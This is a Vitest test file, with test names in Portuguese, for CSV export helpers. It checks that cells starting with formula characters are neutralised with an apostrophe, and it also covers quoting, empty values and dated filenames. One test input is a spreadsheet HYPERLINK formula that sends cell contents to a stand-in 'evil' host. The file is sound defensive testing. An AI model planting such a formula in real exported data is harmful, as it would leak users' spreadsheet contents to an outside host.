import { describe, expect, test } from "vitest"
import { csvCell, csvDocument, csvRow, datedCsvFilename } from "./csv"

describe("csvCell", () => {
	test("neutraliza fórmula com apóstrofo", () => {
		expect(csvCell('=HYPERLINK("https://evil/?"&A1)')).toBe('"\'=HYPERLINK(""https://evil/?""&A1)"')
		expect(csvCell("+1+1")).toBe(`"'+1+1"`)
		expect(csvCell("-2+3")).toBe(`"'-2+3"`)
		expect(csvCell("@SUM(A1)")).toBe(`"'@SUM(A1)"`)
		expect(csvCell("\t=1")).toBe(`"'\t=1"`)
		expect(csvCell("\r=1")).toBe(`"'\r=1"`)
	})

	test("número é isento — inclusive o número já formatado em texto", () => {
		expect(csvCell(-3.5)).toBe('"-3.5"')
		expect(csvCell("-3.5000")).toBe('"-3.5000"')
		expect(csvCell("+10")).toBe('"+10"')
		expect(csvCell(Number.NaN)).toBe('""')
	})

	test("texto comum só ganha aspas; aspas internas são duplicadas", () => {
		expect(csvCell('Arroz "tipo 1", 5 kg')).toBe('"Arroz ""tipo 1"", 5 kg"')
		expect(csvCell("a=b")).toBe('"a=b"')
	})

	test("vazio", () => {
		expect(csvCell(null)).toBe('""')
		expect(csvCell(undefined)).toBe('""')
		expect(csvCell("")).toBe('""')
	})

	test("csvRow respeita o delimitador", () => {
		expect(csvRow(["a", 1, "=x"], ";")).toBe(`"a";"1";"'=x"`)
	})
})

describe("csvDocument", () => {
	test("cabeçalho e linhas escapadas", () => {
		expect(
			csvDocument(
				["Nome", "Qtd"],
				[
					["=x", 2],
					[null, -1],
				]
			)
		).toBe(`"Nome","Qtd"\n"'=x","2"\n"","-1"`)
	})

	test("sem linhas, só o cabeçalho", () => {
		expect(csvDocument(["A"], [])).toBe(`"A"`)
	})
})

describe("datedCsvFilename", () => {
	test("data local, não a UTC", () => {
		// 23h30 em Brasília já é o dia seguinte em UTC.
		const lateEvening = new Date(2026, 8, 27, 23, 30)
		expect(datedCsvFilename("preparacoes", lateEvening)).toBe("preparacoes_2026-09-27.csv")
	})
})
